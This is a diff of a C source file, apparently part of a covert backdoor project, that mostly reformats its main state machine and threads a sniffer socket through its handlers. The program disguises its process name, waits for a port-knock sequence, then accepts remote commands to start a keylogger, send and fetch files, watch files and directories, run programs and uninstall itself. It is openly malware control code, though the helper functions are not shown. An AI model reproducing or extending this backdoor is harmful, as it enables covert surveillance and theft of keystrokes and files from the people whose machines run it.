@@ -11,375 +11,368 @@
 
 #define TIMER_TIME 1
 
-enum main_application_states
-{
-    STATE_CHANGE_NAME = FSM_USER_START,
-    STATE_WAIT_PORT_KNOCK,
-    STATE_LISTEN,
-    STATE_START_KEYLOG,
-    STATE_STOP_KEYLOG,
-    STATE_TRANSFER_FILE,
-    STATE_GET_FILE,
-    STATE_WATCH_FILE,
-    STATE_WATCH_DIRECTORY,
-    STATE_RUN_PROGRAM,
-    STATE_DISCONNECT,
-    STATE_UNINSTALL,
+enum main_application_states {
+  STATE_CHANGE_NAME = FSM_USER_START,
+  STATE_WAIT_PORT_KNOCK,
+  STATE_LISTEN,
+  STATE_START_KEYLOG,
+  STATE_STOP_KEYLOG,
+  STATE_TRANSFER_FILE,
+  STATE_GET_FILE,
+  STATE_WATCH_FILE,
+  STATE_WATCH_DIRECTORY,
+  STATE_RUN_PROGRAM,
+  STATE_DISCONNECT,
+  STATE_UNINSTALL,
 
-    STATE_CLEANUP,
-    STATE_ERROR
+  STATE_CLEANUP,
+  STATE_ERROR
 };
 
-static int change_name_handler(struct fsm_context *context, struct fsm_error *err);
-static int wait_port_knock_handler(struct fsm_context *context, struct fsm_error *err);
+static int change_name_handler(struct fsm_context *context,
+                               struct fsm_error *err);
+static int wait_port_knock_handler(struct fsm_context *context,
+                                   struct fsm_error *err);
 static int listen_handler(struct fsm_context *context, struct fsm_error *err);
-static int start_keylog_handler(struct fsm_context *context, struct fsm_error *err);
-static int stop_keylog_handler(struct fsm_context *context, struct fsm_error *err);
-static int transfer_file_handler(struct fsm_context *context, struct fsm_error *err);
+static int start_keylog_handler(struct fsm_context *context,
+                                struct fsm_error *err);
+static int stop_keylog_handler(struct fsm_context *context,
+                               struct fsm_error *err);
+static int transfer_file_handler(struct fsm_context *context,
+                                 struct fsm_error *err);
 static int get_file_handler(struct fsm_context *context, struct fsm_error *err);
-static int watch_file_handler(struct fsm_context *context, struct fsm_error *err);
-static int watch_directory_handler(struct fsm_context *context, struct fsm_error *err);
-static int run_program_handler(struct fsm_context *context, struct fsm_error *err);
-static int disconnect_handler(struct fsm_context *context, struct fsm_error *err);
-static int uninstall_handler(struct fsm_context *context, struct fsm_error *err);
+static int watch_file_handler(struct fsm_context *context,
+                              struct fsm_error *err);
+static int watch_directory_handler(struct fsm_context *context,
+                                   struct fsm_error *err);
+static int run_program_handler(struct fsm_context *context,
+                               struct fsm_error *err);
+static int disconnect_handler(struct fsm_context *context,
+                              struct fsm_error *err);
+static int uninstall_handler(struct fsm_context *context,
+                             struct fsm_error *err);
 
 static int cleanup_handler(struct fsm_context *context, struct fsm_error *err);
 static int error_handler(struct fsm_context *context, struct fsm_error *err);
 
 static void sigint_handler(int signum);
-static int  setup_signal_handler(struct fsm_error *err);
+static int setup_signal_handler(struct fsm_error *err);
 static void ignore_sigpipe(void);
 
 static volatile sig_atomic_t exit_flag = 0;
 
-int main(int argc, char **argv)
-{
-    struct fsm_error err;
-    struct arguments args = {
-        .connected         = 0,
-        .ip_info.dest_port = 3500,
-        .ip_info.src_port  = 3600,
-    };
-    struct fsm_context context = {
-        .argc = argc,
-        .argv = argv,
-        .args = &args,
-    };
+int main(int argc, char **argv) {
+  struct fsm_error err;
+  struct arguments args = {
+      .connected = 0,
+      .ip_info.dest_port = 3500,
+      .ip_info.src_port = 3600,
+  };
+  struct fsm_context context = {
+      .argc = argc,
+      .argv = argv,
+      .args = &args,
+  };
 
-    init_process_title(argc, argv);
+  init_process_title(argc, argv);
 
-    uint32_t dest_ip;
-    inet_pton(AF_INET, "8.8.8.8", &dest_ip);
+  uint32_t dest_ip;
+  inet_pton(AF_INET, "8.8.8.8", &dest_ip);
 
-    args.ip_info.local_ip = get_local_ip(dest_ip);
+  args.ip_info.local_ip = get_local_ip(dest_ip);
 
-    static struct fsm_transition transitions[] = {
-        {FSM_INIT,              STATE_CHANGE_NAME,     change_name_handler    },
-        {STATE_CHANGE_NAME,     STATE_WAIT_PORT_KNOCK, wait_port_knock_handler},
+  static struct fsm_transition transitions[] = {
+      {FSM_INIT, STATE_CHANGE_NAME, change_name_handler},
+      {STATE_CHANGE_NAME, STATE_WAIT_PORT_KNOCK, wait_port_knock_handler},
 
-        {STATE_LISTEN,          STATE_DISCONNECT,      disconnect_handler     },
-        {STATE_LISTEN,          STATE_UNINSTALL,       uninstall_handler      },
-        {STATE_LISTEN,          STATE_START_KEYLOG,    start_keylog_handler   },
-        {STATE_LISTEN,          STATE_STOP_KEYLOG,     stop_keylog_handler    },
-        {STATE_LISTEN,          STATE_TRANSFER_FILE,   transfer_file_handler  },
-        {STATE_LISTEN,          STATE_GET_FILE,        get_file_handler       },
-        {STATE_LISTEN,          STATE_WATCH_FILE,      watch_file_handler     },
-        {STATE_LISTEN,          STATE_WATCH_DIRECTORY, watch_directory_handler},
-        {STATE_LISTEN,          STATE_RUN_PROGRAM,     run_program_handler    },
-        {STATE_LISTEN,          STATE_LISTEN,          listen_handler         },
+      {STATE_LISTEN, STATE_DISCONNECT, disconnect_handler},
+      {STATE_LISTEN, STATE_UNINSTALL, uninstall_handler},
+      {STATE_LISTEN, STATE_START_KEYLOG, start_keylog_handler},
+      {STATE_LISTEN, STATE_STOP_KEYLOG, stop_keylog_handler},
+      {STATE_LISTEN, STATE_TRANSFER_FILE, transfer_file_handler},
+      {STATE_LISTEN, STATE_GET_FILE, get_file_handler},
+      {STATE_LISTEN, STATE_WATCH_FILE, watch_file_handler},
+      {STATE_LISTEN, STATE_WATCH_DIRECTORY, watch_directory_handler},
+      {STATE_LISTEN, STATE_RUN_PROGRAM, run_program_handler},
+      {STATE_LISTEN, STATE_LISTEN, listen_handler},
 
-        {STATE_WAIT_PORT_KNOCK, STATE_LISTEN,          listen_handler         },
-        {STATE_START_KEYLOG,    STATE_LISTEN,          listen_handler         },
-        {STATE_STOP_KEYLOG,     STATE_LISTEN,          listen_handler         },
-        {STATE_TRANSFER_FILE,   STATE_LISTEN,          listen_handler         },
-        {STATE_GET_FILE,        STATE_LISTEN,          listen_handler         },
-        {STATE_WATCH_FILE,      STATE_LISTEN,          listen_handler         },
-        {STATE_WATCH_DIRECTORY, STATE_LISTEN,          listen_handler         },
-        {STATE_RUN_PROGRAM,     STATE_LISTEN,          listen_handler         },
+      {STATE_WAIT_PORT_KNOCK, STATE_LISTEN, listen_handler},
+      {STATE_START_KEYLOG, STATE_LISTEN, listen_handler},
+      {STATE_STOP_KEYLOG, STATE_LISTEN, listen_handler},
+      {STATE_TRANSFER_FILE, STATE_LISTEN, listen_handler},
+      {STATE_GET_FILE, STATE_LISTEN, listen_handler},
+      {STATE_WATCH_FILE, STATE_LISTEN, listen_handler},
+      {STATE_WATCH_DIRECTORY, STATE_LISTEN, listen_handler},
+      {STATE_RUN_PROGRAM, STATE_LISTEN, listen_handler},
 
-        {STATE_DISCONNECT,      STATE_WAIT_PORT_KNOCK, wait_port_knock_handler},
-        {STATE_UNINSTALL,       STATE_CLEANUP,         cleanup_handler        },
+      {STATE_DISCONNECT, STATE_WAIT_PORT_KNOCK, wait_port_knock_handler},
+      {STATE_UNINSTALL, STATE_CLEANUP, cleanup_handler},
 
-        {STATE_LISTEN,          STATE_ERROR,           error_handler          },
-        {STATE_DISCONNECT,      STATE_ERROR,           error_handler          },
-        {STATE_UNINSTALL,       STATE_ERROR,           error_handler          },
-        {STATE_START_KEYLOG,    STATE_ERROR,           error_handler          },
-        {STATE_STOP_KEYLOG,     STATE_ERROR,           error_handler          },
-        {STATE_TRANSFER_FILE,   STATE_ERROR,           error_handler          },
-        {STATE_GET_FILE,        STATE_ERROR,           error_handler          },
-        {STATE_WATCH_FILE,      STATE_ERROR,           error_handler          },
-        {STATE_WATCH_DIRECTORY, STATE_ERROR,           error_handler          },
-        {STATE_RUN_PROGRAM,     STATE_ERROR,           error_handler          },
+      {STATE_LISTEN, STATE_ERROR, error_handler},
+      {STATE_DISCONNECT, STATE_ERROR, error_handler},
+      {STATE_UNINSTALL, STATE_ERROR, error_handler},
+      {STATE_START_KEYLOG, STATE_ERROR, error_handler},
+      {STATE_STOP_KEYLOG, STATE_ERROR, error_handler},
+      {STATE_TRANSFER_FILE, STATE_ERROR, error_handler},
+      {STATE_GET_FILE, STATE_ERROR, error_handler},
+      {STATE_WATCH_FILE, STATE_ERROR, error_handler},
+      {STATE_WATCH_DIRECTORY, STATE_ERROR, error_handler},
+      {STATE_RUN_PROGRAM, STATE_ERROR, error_handler},
 
-        {STATE_ERROR,           STATE_CLEANUP,         cleanup_handler        },
-        {STATE_CLEANUP,         FSM_EXIT,              NULL                   },
-    };
-    fsm_run(&context, &err, transitions);
+      {STATE_ERROR, STATE_CLEANUP, cleanup_handler},
+      {STATE_CLEANUP, FSM_EXIT, NULL},
+  };
+  fsm_run(&context, &err, transitions);
 
-    return 0;
+  return 0;
 }
 
-static int change_name_handler(struct fsm_context *context, struct fsm_error *err)
-{
-    struct fsm_context *ctx;
-    ctx = context;
-    SET_TRACE(context, "in change name", "STATE_CHANGE_NAME");
-    if (rename_process() != 0)
-    {
-        return STATE_ERROR;
-    }
+static int change_name_handler(struct fsm_context *context,
+                               struct fsm_error *err) {
+  struct fsm_context *ctx;
+  ctx = context;
+  SET_TRACE(context, "in change name", "STATE_CHANGE_NAME");
+  if (rename_process() != 0) {
+    return STATE_ERROR;
+  }
 
-    return STATE_WAIT_PORT_KNOCK;
+  return STATE_WAIT_PORT_KNOCK;
 }
 
-static int wait_port_knock_handler(struct fsm_context *context, struct fsm_error *err)
-{
-    struct fsm_context *ctx;
-    ctx = context;
+static int wait_port_knock_handler(struct fsm_context *context,
+                                   struct fsm_error *err) {
+  struct fsm_context *ctx;
+  ctx = context;
 
-    SET_TRACE(context, "in wait port knock", "STATE_WAIT_PORT_KNOCK");
+  SET_TRACE(context, "in wait port knock", "STATE_WAIT_PORT_KNOCK");
 
-    char   timestamp[32];
-    size_t timestamp_len = sizeof(timestamp);
-    char   src_ip[INET_ADDRSTRLEN];
+  char timestamp[32];
+  size_t timestamp_len = sizeof(timestamp);
+  char src_ip[INET_ADDRSTRLEN];
 
-    if (listen_sequence(timestamp, timestamp_len, src_ip) == 1)
-    {
-        printf("Knock from %s at %s\n", src_ip, timestamp);
-        ctx->args->connected = 1;
+  if (listen_sequence(timestamp, timestamp_len, src_ip) == 1) {
+    printf("Knock from %s at %s\n", src_ip, timestamp);
+    ctx->args->connected = 1;
 
-        if (inet_pton(AF_INET, src_ip, &ctx->args->ip_info.dest_ip) != 1)
-        {
-            printf("Invalid IP address.\n");
-            return -1;
-        }
-
-        usleep(150000);
-        printf("sending string\n");
-        send_string(ctx->args->ip_info, "yY");
+    if (inet_pton(AF_INET, src_ip, &ctx->args->ip_info.dest_ip) != 1) {
+      printf("Invalid IP address.\n");
+      return -1;
     }
 
+    usleep(150000);
+    printf("sending string\n");
+    send_string(ctx->args->ip_info, "yY");
+
+    ctx->args->sock = open_sniffer();
+  }
+
+  return STATE_LISTEN;
+}
+
+static int listen_handler(struct fsm_context *context, struct fsm_error *err) {
+  struct fsm_context *ctx;
+  ctx = context;
+
+  SET_TRACE(context, "in listen handler", "STATE_LISTEN");
+
+  menu_option opt = receive_menu_option(ctx->args->ip_info, ctx->args->sock);
+
+  switch (opt) {
+  case DISCONNECT:
+    printf("Disconnecting...\n");
+    return STATE_DISCONNECT;
+
+  case UNINSTALL:
+    printf("Uninstalling...\n");
+    return STATE_UNINSTALL;
+
+  case START_KEYLOG:
+    printf("Starting keylogger...\n");
+    return STATE_START_KEYLOG;
+
+  case STOP_KEYLOG:
+    printf("Stopping keylogger...\n");
+    return STATE_STOP_KEYLOG;
+
+  case TRANSFER_FILE_TO:
+    printf("Transfer file to remote...\n");
+    return STATE_TRANSFER_FILE;
+
+  case GET_FILE:
+    printf("Getting file from remote...\n");
+    return STATE_GET_FILE;
+
+  case WATCH_FILE:
+    printf("Watching file...\n");
+    return STATE_WATCH_FILE;
+
+  case WATCH_DIR:
+    printf("Watching directory...\n");
+    return STATE_WATCH_DIRECTORY;
+
+  case RUN_PROGRAM:
+    printf("Running program...\n");
+    return STATE_RUN_PROGRAM;
+
+  case LISTEN:
+    printf("Incorrect Option...\n");
     return STATE_LISTEN;
+
+  default:
+    SET_ERROR(err, "Invalid menu option");
+    return STATE_ERROR;
+  }
 }
 
-static int listen_handler(struct fsm_context *context, struct fsm_error *err)
-{
-    struct fsm_context *ctx;
-    ctx = context;
+static int start_keylog_handler(struct fsm_context *context,
+                                struct fsm_error *err) {
+  struct fsm_context *ctx;
+  ctx = context;
 
-    SET_TRACE(context, "in listen handler", "STATE_LISTEN");
+  SET_TRACE(context, "in start keylog handler", "STATE_START_KEYLOG");
 
-    menu_option opt = receive_menu_option(ctx->args->ip_info);
+  if (start_keylogging(ctx->args->ip_info, ctx->args->sock) != 0) {
+    return STATE_ERROR;
+  }
 
-    switch (opt)
-    {
-        case DISCONNECT:
-            printf("Disconnecting...\n");
-            return STATE_DISCONNECT;
-
-        case UNINSTALL:
-            printf("Uninstalling...\n");
-            return STATE_UNINSTALL;
-
-        case START_KEYLOG:
-            printf("Starting keylogger...\n");
-            return STATE_START_KEYLOG;
-
-        case STOP_KEYLOG:
-            printf("Stopping keylogger...\n");
-            return STATE_STOP_KEYLOG;
-
-        case TRANSFER_FILE_TO:
-            printf("Transfer file to remote...\n");
-            return STATE_TRANSFER_FILE;
-
-        case GET_FILE:
-            printf("Getting file from remote...\n");
-            return STATE_GET_FILE;
-
-        case WATCH_FILE:
-            printf("Watching file...\n");
-            return STATE_WATCH_FILE;
-
-        case WATCH_DIR:
-            printf("Watching directory...\n");
-            return STATE_WATCH_DIRECTORY;
-
-        case RUN_PROGRAM:
-            printf("Running program...\n");
-            return STATE_RUN_PROGRAM;
-
-        case LISTEN:
-            printf("Incorrect Option...\n");
-            return STATE_LISTEN;
-
-        default:
-            SET_ERROR(err, "Invalid menu option");
-            return STATE_ERROR;
-    }
+  return STATE_LISTEN;
 }
 
-static int start_keylog_handler(struct fsm_context *context, struct fsm_error *err)
-{
-    struct fsm_context *ctx;
-    ctx = context;
+static int stop_keylog_handler(struct fsm_context *context,
+                               struct fsm_error *err) {
+  struct fsm_context *ctx;
+  ctx = context;
 
-    SET_TRACE(context, "in start keylog handler", "STATE_START_KEYLOG");
+  SET_TRACE(context, "in stop keylog handler", "STATE_STOP_KEYLOG");
 
-    if (start_keylogging(ctx->args->ip_info) != 0)
-    {
-        return STATE_ERROR;
-    }
+  if (stop_keylogger(ctx->args->ip_info) != 0) {
+    return STATE_ERROR;
+  }
 
-    return STATE_LISTEN;
+  return STATE_LISTEN;
 }
 
-static int stop_keylog_handler(struct fsm_context *context, struct fsm_error *err)
-{
-    struct fsm_context *ctx;
-    ctx = context;
+static int transfer_file_handler(struct fsm_context *context,
+                                 struct fsm_error *err) {
+  struct fsm_context *ctx;
+  ctx = context;
 
-    SET_TRACE(context, "in stop keylog handler", "STATE_STOP_KEYLOG");
+  SET_TRACE(context, "in transfer file handler", "STATE_TRANSFER_FILE");
 
-    if (stop_keylogger(ctx->args->ip_info) != 0)
-    {
-        return STATE_ERROR;
-    }
+  if (transfer_file(ctx->args->ip_info, ctx->args->sock) != 0) {
+    return STATE_ERROR;
+  }
 
-    return STATE_LISTEN;
+  return STATE_LISTEN;
 }
 
-static int transfer_file_handler(struct fsm_context *context, struct fsm_error *err)
-{
-    struct fsm_context *ctx;
-    ctx = context;
+static int get_file_handler(struct fsm_context *context,
+                            struct fsm_error *err) {
+  struct fsm_context *ctx;
+  ctx = context;
 
-    SET_TRACE(context, "in transfer file handler", "STATE_TRANSFER_FILE");
+  SET_TRACE(context, "in get file handler", "STATE_GET_FILE");
 
-    if (transfer_file(ctx->args->ip_info) != 0)
-    {
-        return STATE_ERROR;
-    }
+  if (get_file(ctx->args->ip_info, ctx->args->sock) != 0) {
+    return STATE_ERROR;
+  }
 
-    return STATE_LISTEN;
+  return STATE_LISTEN;
 }
 
-static int get_file_handler(struct fsm_context *context, struct fsm_error *err)
-{
-    struct fsm_context *ctx;
-    ctx = context;
+static int watch_file_handler(struct fsm_context *context,
+                              struct fsm_error *err) {
+  struct fsm_context *ctx;
+  ctx = context;
 
-    SET_TRACE(context, "in get file handler", "STATE_GET_FILE");
+  SET_TRACE(context, "in watch file handler", "STATE_WATCH_FILE");
 
-    if (get_file(ctx->args->ip_info) != 0)
-    {
-        return STATE_ERROR;
-    }
+  if (watch_file(ctx->args->ip_info, ctx->args->sock) != 0) {
+    return STATE_ERROR;
+  }
 
-    return STATE_LISTEN;
+  return STATE_LISTEN;
 }
 
-static int watch_file_handler(struct fsm_context *context, struct fsm_error *err)
-{
-    struct fsm_context *ctx;
-    ctx = context;
+static int watch_directory_handler(struct fsm_context *context,
+                                   struct fsm_error *err) {
+  struct fsm_context *ctx;
+  ctx = context;
 
-    SET_TRACE(context, "in watch file handler", "STATE_WATCH_FILE");
+  SET_TRACE(context, "in watch directory handler", "STATE_WATCH_DIRECTORY");
 
-    if (watch_file(ctx->args->ip_info) != 0)
-    {
-        return STATE_ERROR;
-    }
+  if (watch_directory(ctx->args->ip_info, ctx->args->sock) != 0) {
+    return STATE_ERROR;
+  }
 
-    return STATE_LISTEN;
+  return STATE_LISTEN;
 }
 
-static int watch_directory_handler(struct fsm_context *context, struct fsm_error *err)
-{
-    struct fsm_context *ctx;
-    ctx = context;
+static int run_program_handler(struct fsm_context *context,
+                               struct fsm_error *err) {
+  struct fsm_context *ctx;
+  ctx = context;
 
-    SET_TRACE(context, "in watch directory handler", "STATE_WATCH_DIRECTORY");
+  SET_TRACE(context, "in run program handler", "STATE_RUN_PROGRAM");
 
-    if (watch_directory(ctx->args->ip_info) != 0)
-    {
-        return STATE_ERROR;
-    }
+  if (run_program(ctx->args->ip_info, ctx->args->sock) != 0) {
+    return STATE_ERROR;
+  }
 
-    return STATE_LISTEN;
+  return STATE_LISTEN;
 }
 
-static int run_program_handler(struct fsm_context *context, struct fsm_error *err)
-{
-    struct fsm_context *ctx;
-    ctx = context;
+static int disconnect_handler(struct fsm_context *context,
+                              struct fsm_error *err) {
+  struct fsm_context *ctx;
+  ctx = context;
 
-    SET_TRACE(context, "in run program handler", "STATE_RUN_PROGRAM");
+  SET_TRACE(context, "in disconnect handler", "STATE_DISCONNECT");
 
-    if (run_program(ctx->args->ip_info) != 0)
-    {
-        return STATE_ERROR;
-    }
+  if (disconnect(ctx->args->ip_info) != 0) {
+    return STATE_ERROR;
+  }
 
-    return STATE_LISTEN;
+  ctx->args->connected = 0;
+
+  return STATE_WAIT_PORT_KNOCK;
 }
 
-static int disconnect_handler(struct fsm_context *context, struct fsm_error *err)
-{
-    struct fsm_context *ctx;
-    ctx = context;
+static int uninstall_handler(struct fsm_context *context,
+                             struct fsm_error *err) {
+  struct fsm_context *ctx;
+  ctx = context;
 
-    SET_TRACE(context, "in disconnect handler", "STATE_DISCONNECT");
+  SET_TRACE(context, "in uninstall handler", "STATE_UNINSTALL");
 
-    if (disconnect(ctx->args->ip_info) != 0)
-    {
-        return STATE_ERROR;
-    }
+  if (uninstall(ctx->args->ip_info) != 0) {
+    return STATE_ERROR;
+  }
 
-    ctx->args->connected = 0;
-
-    return STATE_WAIT_PORT_KNOCK;
+  return STATE_CLEANUP;
 }
 
-static int uninstall_handler(struct fsm_context *context, struct fsm_error *err)
-{
-    struct fsm_context *ctx;
-    ctx = context;
+static int cleanup_handler(struct fsm_context *context, struct fsm_error *err) {
+  exit_flag++;
+  struct fsm_context *ctx;
+  ctx = context;
+  SET_TRACE(context, "in cleanup handler", "STATE_CLEANUP");
 
-    SET_TRACE(context, "in uninstall handler", "STATE_UNINSTALL");
+  fsm_error_clear(err);
 
-    if (uninstall(ctx->args->ip_info) != 0)
-    {
-        return STATE_ERROR;
-    }
-
-    return STATE_CLEANUP;
+  return FSM_EXIT;
 }
 
-static int cleanup_handler(struct fsm_context *context, struct fsm_error *err)
-{
-    exit_flag++;
-    struct fsm_context *ctx;
-    ctx = context;
-    SET_TRACE(context, "in cleanup handler", "STATE_CLEANUP");
+static int error_handler(struct fsm_context *context, struct fsm_error *err) {
+  fprintf(stderr, "ERROR %s\nIn file %s in function %s on line %d\n",
+          err->err_msg, err->file_name, err->function_name, err->error_line);
 
-    fsm_error_clear(err);
-
-    return FSM_EXIT;
+  return STATE_CLEANUP;
 }
 
-static int error_handler(struct fsm_context *context, struct fsm_error *err)
-{
-    fprintf(stderr, "ERROR %s\nIn file %s in function %s on line %d\n",
-            err->err_msg, err->file_name, err->function_name, err->error_line);
-
-    return STATE_CLEANUP;
-}
-
-static void ignore_sigpipe(void)
-{
-    struct sigaction sa;
-    memset(&sa, 0, sizeof(sa));
-    sa.sa_handler = SIG_IGN;
-    sigaction(SIGPIPE, &sa, NULL);
+static void ignore_sigpipe(void) {
+  struct sigaction sa;
+  memset(&sa, 0, sizeof(sa));
+  sa.sa_handler = SIG_IGN;
+  sigaction(SIGPIPE, &sa, NULL);
 }
